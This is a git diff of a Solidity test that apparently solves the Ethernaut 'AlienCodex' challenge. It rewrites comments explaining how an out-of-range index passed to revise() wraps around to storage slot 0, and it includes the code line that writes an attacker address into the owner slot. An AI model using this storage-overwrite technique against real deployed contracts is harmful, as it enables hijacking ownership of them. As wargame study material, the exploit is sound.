@@ -38,10 +38,14 @@ contract TestAlienCodex is Test {
             // The next trick is to trick the array indexing to point to the owner storage slot
             // owner storage slot in the contract is 0
             // so here's the trick:
-            // startPosition + (type(uint).max + 1 - startPosition)
-            // = type(uint).max + 1 = 0(overflow)
-            // so if we provide (type(uint).max + 1 - startPosition) as input to revise
-            // then that should index the owner slot
+            // since slot is calculated using startPosition + index
+            // if index = - startPosition then  startPosition - startPosition = 0
+            // would give us access to the owner slot
+            // However negative values are not allowed for uint. So we need another trick
+            // we can do the following to fool the EVM: type(uint).max + 1 - startPosition)
+            // = type(uint).max + 1 = 0 as a result of overflow
+            // so if we provide (type(uint).max + 1 - startPosition) as input to the `revise` function
+            // then that should index the owner's slot
             uint position = type(uint).max + 1 - uint(arrayStartPosition);
             alienCodex.revise(position, bytes32(uint(uint160(attacker))));
         }
